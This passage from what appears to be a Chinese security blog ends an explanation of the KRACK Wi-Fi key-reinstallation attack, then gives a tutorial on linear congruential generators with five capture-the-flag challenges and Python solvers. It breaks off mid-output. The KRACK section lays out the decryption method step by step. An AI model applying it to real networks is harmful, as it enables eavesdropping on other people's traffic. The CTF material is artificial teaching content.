<p>在四次握手过程中发过来的明文的msg4 和重传 msg3 后的msg4 处理Authenticator 之外没有不同（msg1和msg2中的Authenticator为同一个，在msg3中则为Authenticator+1），而 Authenticator 对 Msg4 又无影响。此时攻击者有了明文的 Msg4 和对应 Msg4 的密文，明文异或密文便可得到加密时的密钥流。</p>
<p>由于 Nonce 重置导致我们在加密数据时使用的密钥和前面的密钥流是同一个密钥，那我们就可以使用前面推到的密钥流去解密后面传输的数据，最终实现数据的解密。</p>
<p>攻击者作为中间人，放任四次握手过程中的前三次握手，在最后一次握手是阻断msg4的传输，导致 AP 重传Msg3、密钥重装、Nonce 被重置，再根据前面的明文和密文对应关系推到出密钥流，然后通过密钥流解密被重装后加密的数据，最终实现数据解密。</p>
<p><img src="/posts/ae3c8023/24.png"></p>
<p>在Linux和Android系统重设定了接受加密Msg3重传，而在Windows 系统和 IOS 系统违背了 IEEE 规定的802.11标准，不会接受 Msg3 重传而逃过一劫。</p>
<p>对于Krack的防御，对于个人用户针对Krack最方便的方法就是及时更新或安装对应补丁；对于企业用户，可以考虑采用 WIPS 的防御系统，它采用的是与攻击者类似的思路，也是采用链路攻击的方式打掉攻击者的设备而实现保护。</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://www.krackattacks.com/">https://www.krackattacks.com/</a></p>
<p><a href="https://www.kanxue.com/book-47-748.htm">https://www.kanxue.com/book-47-748.htm</a></p>
<p><a href="https://forum.butian.net/share/1819">https://forum.butian.net/share/1819</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2032816">https://cloud.tencent.com/developer/article/2032816</a></p>
<p><a href="https://www.jianshu.com/p/1a1927304a4e">https://www.jianshu.com/p/1a1927304a4e</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/30229178">https://zhuanlan.zhihu.com/p/30229178</a></p>
<p>《黑客大揭秘：近源渗透测试》</p>
]]></content>
      <categories>
        <category>WiFi</category>
      </categories>
      <tags>
        <tag>WiFi</tag>
      </tags>
  </entry>
  <entry>
    <title>流密码之LCG-01</title>
    <url>/posts/40c61146/</url>
    <content><![CDATA[<p>LCG简介</p>
<p>LCG算法，线性同余生成器（Linear congruential generator），一种产生为随机数的方法。</p>
<p>作为流密码（stream cipher）中常用的伪随机数生成器（pseudo random number generator），其随机性能取决于参数和种子的选择。</p>
<p>Xn+1 = (aXn +b) mod m，其中a为乘数、b为增量、m为模数。a/b/m 为产生器设定的常数。</p>
<h3 id="LCG公式推导"><a href="#LCG公式推导" class="headerlink" title="LCG公式推导"></a>LCG公式推导</h3><p>由以上公式可推得一下4个公式:</p>
<table>
<thead>
<tr>
<th>目的</th>
<th>公式</th>
</tr>
</thead>
<tbody><tr>
<td>①Xn+1推出Xn</td>
<td>Xn=(a^-1 (Xn+1 - b))%m</td>
</tr>
<tr>
<td>②求a</td>
<td>a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</td>
</tr>
<tr>
<td>③求b</td>
<td>b=(Xn+1 - aXn)%m</td>
</tr>
<tr>
<td>④求m</td>
<td>tn=Xn+1-Xn，m=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))</td>
</tr>
</tbody></table>
<p>1.Xn+1反推出Xn Xn=(a^-1 (Xn+1 - b))%m</p>
<p>2.求a a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</p>
<p>3.求b b=(Xn+1 - aXn)%m</p>
<p>4.求m tn=Xn+1-Xn，m=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))</p>
<p>公式推导具体如下：</p>
<h4 id="1-Xn-a-1-Xn-1-b-m"><a href="#1-Xn-a-1-Xn-1-b-m" class="headerlink" title="1.Xn=(a^-1 (Xn+1 - b))%m"></a>1.Xn=(a^-1 (Xn+1 - b))%m</h4><p><img src="/posts/40c61146/1.png"></p>
<h4 id="2-a-Xn-2-Xn-1-Xn-1-Xn-1-m"><a href="#2-a-Xn-2-Xn-1-Xn-1-Xn-1-m" class="headerlink" title="2.a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m"></a>2.a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</h4><p><img src="/posts/40c61146/2.png"></p>
<h4 id="3-b-Xn-1-aXn-m"><a href="#3-b-Xn-1-aXn-m" class="headerlink" title="3.b=(Xn+1 - aXn)%m"></a>3.b=(Xn+1 - aXn)%m</h4><p><img src="/posts/40c61146/3.png"></p>
<h4 id="4-tn-Xn-1-Xn，m-gcd-tn-1tn-1-tntn-tntn-2-tn-1tn-1"><a href="#4-tn-Xn-1-Xn，m-gcd-tn-1tn-1-tntn-tntn-2-tn-1tn-1" class="headerlink" title="4.tn=Xn+1-Xn，m=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))"></a>4.tn=Xn+1-Xn，m=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))</h4><p><img src="/posts/40c61146/4.png"></p>
<p><img src="/posts/40c61146/5.png"></p>
<h3 id="LCG基础题目"><a href="#LCG基础题目" class="headerlink" title="LCG基础题目"></a>LCG基础题目</h3><p>题目来源 <a href="https://blog.csdn.net/superprintf/article/details/108964563">https://blog.csdn.net/superprintf/article/details/108964563</a></p>
<h4 id="LCG-1"><a href="#LCG-1" class="headerlink" title="LCG-1"></a>LCG-1</h4><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;***********************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = <span class="number">33477128523140105764301644224721378964069</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;seed = &quot;</span>,seed)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed^plaintext</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br><span class="line"><span class="comment"># seed =  33477128523140105764301644224721378964069</span></span><br><span class="line"><span class="comment"># a =  216636540518719887613942270143367229109002078444183475587474655399326769391</span></span><br><span class="line"><span class="comment"># b =  186914533399403414430047931765983818420963789311681346652500920904075344361</span></span><br><span class="line"><span class="comment"># n =  155908129777160236018105193822448288416284495517789603884888599242193844951</span></span><br><span class="line"><span class="comment"># c =  209481865531297761516458182436122824479565806914713408748457524641378381493</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h5><p>已知  a b n    c=seed^m 求m </p>
<p> m=seed^c 可以求得，而c为已知项，seed 已知</p>
<p>for i in range(10):</p>
<p>seed = (a*seed+b)%n</p>
<h5 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">seed =  <span class="number">33477128523140105764301644224721378964069</span></span><br><span class="line">a =  <span class="number">216636540518719887613942270143367229109002078444183475587474655399326769391</span></span><br><span class="line">b =  <span class="number">186914533399403414430047931765983818420963789311681346652500920904075344361</span></span><br><span class="line">n =  <span class="number">155908129777160236018105193822448288416284495517789603884888599242193844951</span></span><br><span class="line">c =  <span class="number">209481865531297761516458182436122824479565806914713408748457524641378381493</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">m = seed^c</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># 147424144810829416246263598495658483373775464141840154829404726417260880253</span></span><br><span class="line"><span class="comment"># b&#x27;Spirit&#123;0ops!___you_know__LCG!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="LCG2"><a href="#LCG2" class="headerlink" title="LCG2"></a>LCG2</h4><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*****************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># a =  59398519837969938359106832224056187683937568250770488082448642852427682484407513407602969</span></span><br><span class="line"><span class="comment"># b =  32787000674666987602016858366912565306237308217749461581158833948068732710645816477126137</span></span><br><span class="line"><span class="comment"># n =  43520375935212094874930431059580037292338304730539718469760580887565958566208139467751467</span></span><br><span class="line"><span class="comment"># c =  8594514452808046357337682911504074858048299513743867887936794439125949418153561841842276</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>已知 a b n  已知密文c 为最终seed</p>
<p>求 m   m为初始seed</p>
<p>循环十次 最终得到初始seed</p>
<p>Xn=(a^-1 (Xn+1 - b))%m</p>
<p>对应公式为   MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #逆元计算</p>
<p>ani=MMI(a,n) </p>
<h5 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">a =  <span class="number">59398519837969938359106832224056187683937568250770488082448642852427682484407513407602969</span></span><br><span class="line">b =  <span class="number">32787000674666987602016858366912565306237308217749461581158833948068732710645816477126137</span></span><br><span class="line">n =  <span class="number">43520375935212094874930431059580037292338304730539718469760580887565958566208139467751467</span></span><br><span class="line">c =  <span class="number">8594514452808046357337682911504074858048299513743867887936794439125949418153561841842276</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这两种都可以去求 逆元</span></span><br><span class="line"><span class="comment"># MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #逆元计算</span></span><br><span class="line"><span class="comment"># ani=MMI(a,n)</span></span><br><span class="line">ani = gmpy2.invert(a,n)</span><br><span class="line">seed=c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (ani*(seed-b))%n</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed))</span><br><span class="line"><span class="comment"># 41496207727216587746731918844219889152464603755197286927180022389268761169026372950106493</span></span><br><span class="line"><span class="comment"># b&#x27;Spirit&#123;Orzzz__number_the0ry_master!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="LCG3"><a href="#LCG3" class="headerlink" title="LCG3"></a>LCG3</h4><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*********************&#125;&#x27;</span></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">seed = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">b = plaintext</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output1 = &quot;</span>,output[<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output2 = &quot;</span>,output[<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># a =  3227817955364471534349157142678648291258297398767210469734127072571531</span></span><br><span class="line"><span class="comment"># n =  2731559135349690299261470294200742325021575620377673492747570362484359</span></span><br><span class="line"><span class="comment"># output1 =  56589787378668192618096432693925935599152815634076528548991768641673</span></span><br><span class="line"><span class="comment"># output2 =  2551791066380515596393984193995180671839531603273409907026871637002460</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h5><p>已知 a  n     已知an6 an7</p>
<p>b = m 求b</p>
<p>b=(Xn+1 - aXn)%m</p>
<p>b = (an7 - a*an6)%n</p>
<h5 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gmpy2</span><br><span class="line">a =  <span class="number">3227817955364471534349157142678648291258297398767210469734127072571531</span></span><br><span class="line">n =  <span class="number">2731559135349690299261470294200742325021575620377673492747570362484359</span></span><br><span class="line">output1 =  <span class="number">56589787378668192618096432693925935599152815634076528548991768641673</span></span><br><span class="line">output2 =  <span class="number">2551791066380515596393984193995180671839531603273409907026871637002460</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b=(Xn+1 - aXn)%m</span></span><br><span class="line">b = (output2 - a*output1)%n</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(b))</span><br><span class="line"><span class="comment"># 2249513928387900043419621487136593156497460191283027871178330274556029</span></span><br><span class="line"><span class="comment"># b&#x27;Spirit&#123;Y0u_@r3_g00d_at__math&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="LCG-4"><a href="#LCG-4" class="headerlink" title="LCG-4"></a>LCG-4</h4><h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;********************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br><span class="line"><span class="comment"># n =  714326667532888136341930300469812503108568533171958701229258381897431946521867367344505142446819</span></span><br><span class="line"><span class="comment"># output =  [683884150135567569054700309393082274015273418755015984639210872641629102776137288905334345358223, 285126221039239401347664578761309935673889193236512702131697050766454881029340147180552409870425, 276893085775448203669487661735680485319995668779836512706851431217470824660349740546793492847822, 670041467944152108349892479463033808393249475608933110640580388877206700116661070302382578388629, 122640993538161410588195475312610802051543155060328971488277224112081166784263153107636108815824, 695403107966797625391061914491496301998976621394944936827202540832952594905520247784142392337171, 108297989103402878258100342544600235524390749601427490182149765480916965811652000881230504838949, 3348901603647903020607356217291999644800579775392251732059562193080862524671584235203807354488, 632094372828241320671255647451901056399237760301503199444470380543753167478243100611604222284853, 54758061879225024125896909645034267106973514243188358677311238070832154883782028437203621709276]</span></span><br></pre></td></tr></table></figure>

<h5 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h5><p>已知  n   an[]，求 m  </p>
<p> m为初始化seed 所以求出seed0即可</p>
<p>可以通过推导公式2 求得 a</p>
<p>在通过公式3 求得 b</p>
<p>seed = (a*seed+b)%n</p>
<p>seed1 = (a * seed0 +b )%n</p>
<p>通过公式1 Xn=(a^-1 (Xn+1 - b))%m 推得seed0 即明文</p>
<p>seed0 = (  (seed1 - b)  * (a^-1)  )%n</p>
<p>seed1 = output[0]</p>
<p>所以 seed0  = ((output[0]-b)*ani )%n</p>
<h5 id="WP-3"><a href="#WP-3" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n =  <span class="number">714326667532888136341930300469812503108568533171958701229258381897431946521867367344505142446819</span></span><br><span class="line">output =  [<span class="number">683884150135567569054700309393082274015273418755015984639210872641629102776137288905334345358223</span>, <span class="number">285126221039239401347664578761309935673889193236512702131697050766454881029340147180552409870425</span>, <span class="number">276893085775448203669487661735680485319995668779836512706851431217470824660349740546793492847822</span>, <span class="number">670041467944152108349892479463033808393249475608933110640580388877206700116661070302382578388629</span>, <span class="number">122640993538161410588195475312610802051543155060328971488277224112081166784263153107636108815824</span>, <span class="number">695403107966797625391061914491496301998976621394944936827202540832952594905520247784142392337171</span>, <span class="number">108297989103402878258100342544600235524390749601427490182149765480916965811652000881230504838949</span>, <span class="number">3348901603647903020607356217291999644800579775392251732059562193080862524671584235203807354488</span>, <span class="number">632094372828241320671255647451901056399237760301503199444470380543753167478243100611604222284853</span>, <span class="number">54758061879225024125896909645034267106973514243188358677311238070832154883782028437203621709276</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求a a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</span></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line">a = (output[<span class="number">3</span>]-output[<span class="number">2</span>]) * MMI((output[<span class="number">2</span>]-output[<span class="number">1</span>]),n)%n</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这两种方法都可以求 逆元</span></span><br><span class="line"><span class="comment"># ani=MMI(a,n)</span></span><br><span class="line">ani=gmpy2.invert(a,n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求b b=(Xn+1 - aXn)%m</span></span><br><span class="line">b = (output[<span class="number">2</span>] - a*output[<span class="number">1</span>])%n</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求明文m</span></span><br><span class="line">seed0  = ((output[<span class="number">0</span>]-b)*ani )%n</span><br><span class="line"><span class="built_in">print</span>(seed0)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed0))</span><br><span class="line"><span class="comment"># 65863586327872307178215811859890622391386702699190067821678721759311822315235571722857932007760</span></span><br><span class="line"><span class="comment"># 580530341837176922585879619790971707330065277035664726870365931385222825590112557483074386629351</span></span><br><span class="line"><span class="comment"># 696190840220381770483412363798400195080823210401430601069787735566362644430227092882973263012221</span></span><br><span class="line"><span class="comment"># b&#x27;Spirit&#123;Gr3at__J0b!_You_can_be___better!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="LCG-5"><a href="#LCG-5" class="headerlink" title="LCG-5"></a>LCG-5</h4><h5 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;****************************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br><span class="line"><span class="comment"># output =  [9997297986272510947766344959498975323136012075787120721424325775003840341552673589487134830298427997676238039214108, 4943092972488023184271739094993470430272327679424224016751930100362045115374960494124801675393555642497051610643836, 6774612894247319645272578624765063875876643849415903973872536662648051668240882405640569448229188596797636795502471, 9334780454901460926052785252362305555845335155501888087843525321238695716687151256717815518958670595053951084051571, 2615136943375677027346821049033296095071476608523371102901038444464314877549948107134114941301290458464611872942706, 11755491858586722647182265446253701221615594136571038555321378377363341368427070357031882725576677912630050307145062, 7752070270905673490804344757589080653234375679657568428025599872155387643476306575613147681330227562712490805492345, 8402957532602451691327737154745340793606649602871190615837661809359377788072256203797817090151599031273142680590748, 2802440081918604590502596146113670094262600952020687184659605307695151120589816943051322503094363578916773414004662, 5627226318035765837286789021891141596394835871645925685252241680021740265826179768429792645576780380635014113687982]</span></span><br></pre></td></tr></table></figure>

<h5 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h5><p>已知 seed数组，求明文plaintext ，而plaintext=seed0</p>
<p>需要先求模数n，利用推导公式4 然后求 a，再求 b，最后求出seed0 。</p>
<p>和题目4相比 多了求模数n一步</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">all_t = []</span><br><span class="line">all_n = []</span><br><span class="line">t[i] = output[i]-output[i-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">   all_t.append(output[i]-output[i-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   all_n.append(gcd( (t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]) , (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]) ))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>会得到一些列的模数n</p>
<p>进行遍历 for n in all_n:  但是得到的模数中存在负数及1 需要取绝对值并将1跳过</p>
<h5 id="WP-4"><a href="#WP-4" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line">output =  [<span class="number">9997297986272510947766344959498975323136012075787120721424325775003840341552673589487134830298427997676238039214108</span>, <span class="number">4943092972488023184271739094993470430272327679424224016751930100362045115374960494124801675393555642497051610643836</span>, <span class="number">6774612894247319645272578624765063875876643849415903973872536662648051668240882405640569448229188596797636795502471</span>, <span class="number">9334780454901460926052785252362305555845335155501888087843525321238695716687151256717815518958670595053951084051571</span>, <span class="number">2615136943375677027346821049033296095071476608523371102901038444464314877549948107134114941301290458464611872942706</span>, <span class="number">11755491858586722647182265446253701221615594136571038555321378377363341368427070357031882725576677912630050307145062</span>, <span class="number">7752070270905673490804344757589080653234375679657568428025599872155387643476306575613147681330227562712490805492345</span>, <span class="number">8402957532602451691327737154745340793606649602871190615837661809359377788072256203797817090151599031273142680590748</span>, <span class="number">2802440081918604590502596146113670094262600952020687184659605307695151120589816943051322503094363578916773414004662</span>, <span class="number">5627226318035765837286789021891141596394835871645925685252241680021740265826179768429792645576780380635014113687982</span>]</span><br><span class="line"><span class="comment"># print(len(output))</span></span><br><span class="line"><span class="comment"># 10</span></span><br><span class="line">t = []</span><br><span class="line">all_n = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)-<span class="number">1</span>):</span><br><span class="line">    t.append(output[i]-output[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)-<span class="number">3</span>):</span><br><span class="line">    all_n.append(gcd( (t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]) , (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]) ))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(all_n)</span><br><span class="line"><span class="comment"># 求出来的 模数n 有正有负 需要取绝对值 然后如果模数为1 pass掉</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n = <span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n ==<span class="number">1</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 求a a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</span></span><br><span class="line">    MMI = <span class="keyword">lambda</span> A, n, s=<span class="number">1</span>, t=<span class="number">0</span>, N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t % N <span class="keyword">or</span> MMI(n, A % n, t, s - A // n * t, N <span class="keyword">or</span> n), -<span class="number">1</span>)[n &lt; <span class="number">1</span>]  <span class="comment"># 逆元计算</span></span><br><span class="line">    a = (output[<span class="number">3</span>] - output[<span class="number">2</span>]) * MMI((output[<span class="number">2</span>] - output[<span class="number">1</span>]), n) % n</span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">    ani = MMI(a, n)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求b b=(Xn+1 - aXn)%m</span></span><br><span class="line">    b = (output[<span class="number">2</span>] - a * output[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="comment"># print(b)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求明文m</span></span><br><span class="line">    seed0 = ((output[<span class="number">0</span>] - b) * ani) % n</span><br><span class="line">    <span class="built_in">print</span>(seed0)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(seed0))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[-2, -1, -393916182865583204167593579626567099983463054572651446294350689155749034982777402793379583263905054399035065243497725, -393916182865583204167593579626567099983463054572651446294350689155749034982777402793379583263905054399035065243497725, -15756647314623328166703743185062683999338522182906057851774027566229961399311096111735183330556202175961402609739909, -47269941943869984500111229555188051998015566548718173555322082698689884197933288335205549991668606527884207829219727, 47269941943869984500111229555188051998015566548718173555322082698689884197933288335205549991668606527884207829219727]</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">b&#x27;\x01&#x27;</span></span><br><span class="line"><span class="string">211188662731758863427946381877198496775371670862648580138469143303016383244049847985679632443910715787648463257824063</span></span><br><span class="line"><span 